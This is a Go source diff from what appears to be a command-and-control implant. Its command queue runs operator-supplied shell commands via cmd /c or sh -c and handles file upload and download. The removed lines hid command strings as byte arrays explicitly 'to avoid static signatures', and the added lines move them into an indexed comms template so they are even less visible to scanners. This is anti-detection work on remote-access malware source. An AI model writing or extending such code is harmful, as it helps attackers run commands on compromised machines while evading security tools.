@@ -18,21 +18,21 @@ import (
 	"unicode"
 )
 
-// Command queue strings (constructed to avoid static signatures)
-// Note: inline-assembly and bof commands are dispatched by numeric CommandType ID,
-// so those string constants have been removed (dead code).
-var (
-	// Used by parseDownloadCommand/parseUploadCommand
-	cqCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})   // upload
-	cqCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download
-
-	// Used by executeShellCommand fallback
-	cqWordWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73}) // windows
-	cqShellCmd    = string([]byte{0x63, 0x6d, 0x64})                         // cmd
-	cqShellCmdArg = string([]byte{0x2f, 0x63})                               // /c
-	cqShellSh     = string([]byte{0x73, 0x68})                               // sh
-	cqShellShArg  = string([]byte{0x2d, 0x63})                               // -c
+// Command queue template indices - must match server's common.go
+const (
+	idxCqWordWindows = 780 // windows
+	idxCqShellCmd    = 781 // cmd
+	idxCqShellCmdArg = 782 // /c
+	idxCqShellSh     = 783 // sh
+	idxCqShellShArg  = 784 // -c
+	idxCqCmdDownload = 785 // download
+	idxCqCmdUpload   = 786 // upload
 )
+
+// getCqStr gets command queue string from comms template
+func getCqStr(idx int) string {
+	return commsTpl(idx)
+}
 
 // CommandQueue manages the processing of commands
 type CommandQueue struct {
@@ -323,9 +323,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	var args []string
 	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))
 
-	if strings.HasPrefix(cmdLower, cqCmdDownload) {
+	if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdDownload)) {
 		args = parseDownloadCommand(cmd.Command)
-	} else if strings.HasPrefix(cmdLower, cqCmdUpload) {
+	} else if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdUpload)) {
 		args = parseUploadCommand(cmd.Command)
 	} else {
 		args = parseCommandLine(cmd.Command)
@@ -401,10 +401,10 @@ func (cq *CommandQueue) applySessionEnvironment() {
 func executeShellCommand(command string) (string, error) {
 	var cmd *exec.Cmd
 
-	if runtime.GOOS == cqWordWindows {
-		cmd = exec.Command(cqShellCmd, cqShellCmdArg, command)
+	if runtime.GOOS == getCqStr(idxCqWordWindows) {
+		cmd = exec.Command(getCqStr(idxCqShellCmd), getCqStr(idxCqShellCmdArg), command)
 	} else {
-		cmd = exec.Command(cqShellSh, cqShellShArg, command)
+		cmd = exec.Command(getCqStr(idxCqShellSh), getCqStr(idxCqShellShArg), command)
 	}
 
 	output, err := cmd.CombinedOutput()
@@ -471,12 +471,12 @@ func parseCommandLine(cmdLine string) []string {
 func parseDownloadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdDownload) {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdDownload)) {
 		return parseCommandLine(cmdLine)
 	}
 
 	if len(cmdLine) <= 8 {
-		return []string{cqCmdDownload}
+		return []string{getCqStr(idxCqCmdDownload)}
 	}
 
 	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
@@ -486,7 +486,7 @@ func parseDownloadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[8:])
 
 	if remainder == "" {
-		return []string{cqCmdDownload}
+		return []string{getCqStr(idxCqCmdDownload)}
 	}
 
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
@@ -494,19 +494,19 @@ func parseDownloadCommand(cmdLine string) []string {
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	return []string{cqCmdDownload, remainder}
+	return []string{getCqStr(idxCqCmdDownload), remainder}
 }
 
 // parseUploadCommand specifically handles the upload command
 func parseUploadCommand(cmdLine string) []string {
 	cmdLine = strings.TrimSpace(cmdLine)
 
-	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdUpload) {
+	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdUpload)) {
 		return parseCommandLine(cmdLine)
 	}
 
 	if len(cmdLine) <= 6 {
-		return []string{cqCmdUpload}
+		return []string{getCqStr(idxCqCmdUpload)}
 	}
 
 	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
@@ -516,7 +516,7 @@ func parseUploadCommand(cmdLine string) []string {
 	remainder := strings.TrimSpace(cmdLine[6:])
 
 	if remainder == "" {
-		return []string{cqCmdUpload}
+		return []string{getCqStr(idxCqCmdUpload)}
 	}
 
 	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
@@ -524,7 +524,7 @@ func parseUploadCommand(cmdLine string) []string {
 		remainder = remainder[1 : len(remainder)-1]
 	}
 
-	return []string{cqCmdUpload, remainder}
+	return []string{getCqStr(idxCqCmdUpload), remainder}
 }
 
 // Download/Upload tracking methods are in job_manager.go
